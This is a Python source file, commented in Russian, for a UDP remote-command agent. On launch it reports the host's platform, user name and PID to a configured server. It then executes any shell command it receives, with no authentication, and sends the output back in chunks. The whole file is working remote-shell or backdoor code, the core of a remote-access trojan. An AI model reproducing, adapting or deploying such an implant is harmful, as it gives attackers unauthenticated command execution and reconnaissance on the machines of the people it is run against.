import socket
import subprocess
import threading
import time
import codecs
import os
import sys
import tempfile

SERVER_IP = 'localhost'
SERVER_PORT = 9999
CLIENT_PORT = 8888


MAX_DATA_BYTES = 16380
PAUSE = 0.1


class Socket():
    def __init__(self):
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.socket.bind(("",CLIENT_PORT))
        self.address = (SERVER_IP, SERVER_PORT) # адрес клиента
        self.send_data('Сервер запущен в %s:%s:%s\nПлатформа: %s\nПользователь: %s\nPID: %s' %(
         time.localtime().tm_hour,
         time.localtime().tm_min,
         time.localtime().tm_sec,
         sys.platform,
         os.getlogin(),
         os.getpid())
        )
        self.listen() #запускаю прослушивание порта

    def listen(self):
        '''метод слушает порт'''
        while True:
            data, address = self.socket.recvfrom(MAX_DATA_BYTES) 
            decoded_data = codecs.decode(data) # раскодирую принятую информацию
            #если пришёл пакет [chk?], то это проверка на подключение
            if decoded_data == '[chk?]':
                self.send_data('[chk!]')
            else:
                #запускаю выполнение задачи в потоке, что бы избежать возможного зацикливания
                self.command_thread = threading.Thread(target=self.execute_command, args=(decoded_data, ))
                self.daemon = True
                self.command_thread.start()
            
    def send_data(self, data, flag=''):
        '''
        Оправляет данные по сокету. Принимает флаги:
        флага нет - передаваемая инфа должна идти в консоль
        fm - передается список файлов и каталогов
        py - передается вывод интерпретатора python
        tm - список запущенных процессов
        fl - пакет файла [fl][имя файла][номер пакета]
        '''
        client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        client_socket.sendto(data.encode('utf-8'), self.address)
        client_socket.close()

    def execute_command(self, command):
        '''выполнение команды. Если нужно передать пароль, или любой другой
        аргумент, пиши его в квадратных скобках. Например: python [print(123)]
        запутит интерпретатор пайтон, и выполнит в нём строку в кв.скобках
        '''
        #создаю временные файлы, что-бы нельзя было прочитать пароли и т.д.
        stdin = tempfile.SpooledTemporaryFile(max_size=2048, mode='wb+')
        stdout = tempfile.TemporaryFile(mode='wb+')
        stderr = tempfile.TemporaryFile(mode='wb+')
        #разбираю поступившую команду, отделяя от неё аргументы 
        parsed_command = command.split(' [')
        if len(parsed_command) > 1:
            for argument in range(1, len(parsed_command)):
                stdin.write(('%s\n' %(parsed_command[argument][:parsed_command[argument].find(']')])).encode('utf-8'))
            stdin.seek(0) #перевожу курсор в начало файла
        command = parsed_command[0]
        #выполняю команду
        cmd = subprocess.call(command, shell=True, stdin=stdin, stdout=stdout, stderr=stderr)
        #перевожу курсоры в начало файлов
        stdout.seek(0)
        stderr.seek(0)
        #объединяю вывод консоли и вывод об ошибках в одну строку
        output_text = stdout.read()+stderr.read()
        if len(output_text) > 0:
            if output_text[-1] == '\n':
                output_text = output_text[:-1]
        #проверяю какая система, что-бы установить кодировку
        if os.name == 'nt':
            output_text = output_text.decode('cp866')
        else:
            output_text = output_text.decode('utf-8')
        #отправляю полученную строку
        if len(output_text) < MAX_DATA_BYTES // 8:
            self.send_data(output_text)
        else:
            self.processing_bufer(bufer=output_text) 

    def processing_bufer(self, bufer, file_name = '', flag=''):
        """
        метод передаёт пакеты данных
        Принимает такие-же флаги как и метод send_data
        """
        while len(bufer) > 0:#пока есть что передавать (в буфере или в пакете),
                             # передаю эти данные в цикле
            pack = ''        #в эту переменную формируется пакет данных
            pack += bufer[:MAX_DATA_BYTES // 8] #формирую пакет
            bufer = bufer[MAX_DATA_BYTES // 8:]
            if len(bufer) == 0:
                break
            time.sleep(PAUSE)
            self.send_data(data=pack)
            pack = ''
        # проверяю буфер пакетов
        if len(pack) > 0:  #если пакет данных не пустой
            time.sleep(PAUSE)
            self.send_data(data=pack, flag=flag)
        pack = '' #обнуляю значение пакета


if __name__ == "__main__":
    while True:
        # try:
        #     server = Socket()
        # except:
        #     time.sleep(0.3)
        server = Socket()

